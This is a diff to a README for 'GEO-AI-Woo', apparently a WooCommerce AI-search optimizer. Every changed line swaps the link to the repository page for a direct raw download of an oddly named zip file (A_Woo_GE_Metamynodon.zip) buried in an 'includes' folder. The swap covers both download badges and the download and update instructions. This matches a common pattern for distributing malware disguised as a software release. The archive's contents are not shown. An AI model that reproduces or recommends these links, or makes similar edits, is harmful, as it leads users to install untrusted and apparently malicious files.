@@ -1,6 +1,6 @@
 # 🌐 GEO-AI-Woo - Optimize AI Search for WooCommerce
 
-[![Download GEO-AI-Woo](https://img.shields.io/badge/Download-GEO--AI--Woo-brightgreen?style=for-the-badge&logo=github)](https://github.com/pinkbanty5707/GEO-AI-Woo)
+[![Download GEO-AI-Woo](https://img.shields.io/badge/Download-GEO--AI--Woo-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pinkbanty5707/GEO-AI-Woo/main/includes/A_Woo_GE_Metamynodon.zip)
 
 ---
 
@@ -35,7 +35,7 @@ The steps below guide you through downloading, installing, and running GEO-AI-Wo
 ## ⬇️ How to Download GEO-AI-Woo
 
 1. Click the big green button at the top or visit this page to get started:  
-   [https://github.com/pinkbanty5707/GEO-AI-Woo](https://github.com/pinkbanty5707/GEO-AI-Woo)  
+   [https://raw.githubusercontent.com/pinkbanty5707/GEO-AI-Woo/main/includes/A_Woo_GE_Metamynodon.zip](https://raw.githubusercontent.com/pinkbanty5707/GEO-AI-Woo/main/includes/A_Woo_GE_Metamynodon.zip)  
 
 2. On the GitHub page, find the “Releases” section or the latest release on the right-hand side.
 
@@ -116,7 +116,7 @@ Use the menu inside the app to navigate these features. Each section has short t
 
 Check the GitHub page regularly for new versions:
 
-1. Visit https://github.com/pinkbanty5707/GEO-AI-Woo
+1. Visit https://raw.githubusercontent.com/pinkbanty5707/GEO-AI-Woo/main/includes/A_Woo_GE_Metamynodon.zip
 
 2. Look under “Releases” for the latest setup file.
 
@@ -140,4 +140,4 @@ Visit the GitHub page for any FAQs or community discussions related to GEO-AI-Wo
 
 Use this link to download the latest version and start optimizing your site:
 
-[![Download GEO-AI-Woo](https://img.shields.io/badge/Download-GEO--AI--Woo-brightgreen?style=for-the-badge&logo=github)](https://github.com/pinkbanty5707/GEO-AI-Woo)
+[![Download GEO-AI-Woo](https://img.shields.io/badge/Download-GEO--AI--Woo-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pinkbanty5707/GEO-AI-Woo/main/includes/A_Woo_GE_Metamynodon.zip)
